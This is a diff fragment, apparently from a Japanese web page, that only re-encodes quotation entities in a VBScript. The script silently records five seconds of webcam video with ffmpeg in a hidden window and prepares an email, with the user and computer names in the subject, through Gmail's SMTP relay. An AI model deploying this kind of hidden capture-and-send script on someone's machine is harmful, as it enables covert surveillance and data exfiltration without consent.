@@ -116,33 +116,33 @@ Dim strFilePath
 Dim objNetwork
 Dim objMsg
 
-Set objShell = CreateObject(&quot;WScript.Shell&quot;)
-Set objFS = CreateObject(&quot;Scripting.FileSystemObject&quot;)
+Set objShell = CreateObject(&#34;WScript.Shell&#34;)
+Set objFS = CreateObject(&#34;Scripting.FileSystemObject&#34;)
 
 strDate = Year(Now())
-strDate = strDate &amp; Right(&quot;0&quot; + Month(Now()), 2)
-strDate = strDate &amp; Right(&quot;0&quot; + Day(Now()), 2)
-strDate = strDate &amp; Right(&quot;0&quot; + Hour(Now()), 2)
-strDate = strDate &amp; Right(&quot;0&quot; + Minute(Now()), 2)
-strDate = strDate &amp; Right(&quot;0&quot; + Second(Now()), 2)
+strDate = strDate &amp; Right(&#34;0&#34; + Month(Now()), 2)
+strDate = strDate &amp; Right(&#34;0&#34; + Day(Now()), 2)
+strDate = strDate &amp; Right(&#34;0&#34; + Hour(Now()), 2)
+strDate = strDate &amp; Right(&#34;0&#34; + Minute(Now()), 2)
+strDate = strDate &amp; Right(&#34;0&#34; + Second(Now()), 2)
 
-strFilePath = objFS.getSpecialFolder(2).Path &amp; &quot;\&quot; + strDate + &quot;.mp4&quot;
+strFilePath = objFS.getSpecialFolder(2).Path &amp; &#34;\&#34; + strDate + &#34;.mp4&#34;
 
-objShell.Run &quot;ffmpeg -f dshow -t 5 -video_size 1280x720 -framerate 7.5 -pixel_format yuyv422 -i video=&quot;&quot;USB HD Webcam&quot;&quot; -r 30 -c:v libx264 -y &quot;&quot;&quot; &amp; strFilePath &amp; &quot;&quot;&quot;&quot;, 0, True
+objShell.Run &#34;ffmpeg -f dshow -t 5 -video_size 1280x720 -framerate 7.5 -pixel_format yuyv422 -i video=&#34;&#34;USB HD Webcam&#34;&#34; -r 30 -c:v libx264 -y &#34;&#34;&#34; &amp; strFilePath &amp; &#34;&#34;&#34;&#34;, 0, True
 
-Set objNetwork = CreateObject(&quot;WScript.Network&quot;)
-Set objMsg = CreateObject(&quot;CDO.Message&quot;)
+Set objNetwork = CreateObject(&#34;WScript.Network&#34;)
+Set objMsg = CreateObject(&#34;CDO.Message&#34;)
 
-objMsg.From = &quot;(送信元メールアドレス)&quot;
-objMsg.ReplyTo = &quot;(返信先メールアドレス(任意))&quot;
-objMsg.To = &quot;(宛先メールアドレス)&quot;
-objMsg.Subject = &quot;Message from &quot; + objNetwork.UserName + &quot; &quot; + objNetwork.ComputerName
-objMsg.TextBody = &quot;Recorded Video&quot;
-objMsg.TextBodyPart.Charset = &quot;ISO-2022-JP&quot;
-objMsg.Configuration.Fields.Item(&quot;http://schemas.microsoft.com/cdo/configuration/sendusing&quot;) = 2
-objMsg.Configuration.Fields.Item(&quot;http://schemas.microsoft.com/cdo/configuration/smtpusessl&quot;) = True
-objMsg.Configuration.Fields.Item(&quot;http://schemas.microsoft.com/cdo/configuration/smtpserver&quot;) = &quot;smtp-relay.gmail.com&quot;
-objMsg.Configuration.Fields.Item(&quot;http://schemas.microsoft.com/cdo/configuration/smtpserverport&quot;) = 465
+objMsg.From = &#34;(送信元メールアドレス)&#34;
+objMsg.ReplyTo = &#34;(返信先メールアドレス(任意))&#34;
+objMsg.To = &#34;(宛先メールアドレス)&#34;
+objMsg.Subject = &#34;Message from &#34; + objNetwork.UserName + &#34; &#34; + objNetwork.ComputerName
+objMsg.TextBody = &#34;Recorded Video&#34;
+objMsg.TextBodyPart.Charset = &#34;ISO-2022-JP&#34;
+objMsg.Configuration.Fields.Item(&#34;http://schemas.microsoft.com/cdo/configuration/sendusing&#34;) = 2
+objMsg.Configuration.Fields.Item(&#34;http://schemas.microsoft.com/cdo/configuration/smtpusessl&#34;) = True
+objMsg.Configuration.Fields.Item(&#34;http://schemas.microsoft.com/cdo/configuration/smtpserver&#34;) = &#34;smtp-relay.gmail.com&#34;
+objMsg.Configuration.Fields.Item(&#34;http://schemas.microsoft.com/cdo/configuration/smtpserverport&#34;) = 465
 objMsg.Configuration.Fields.Update
 
 If objFS.FileExists(strFilePath) Then
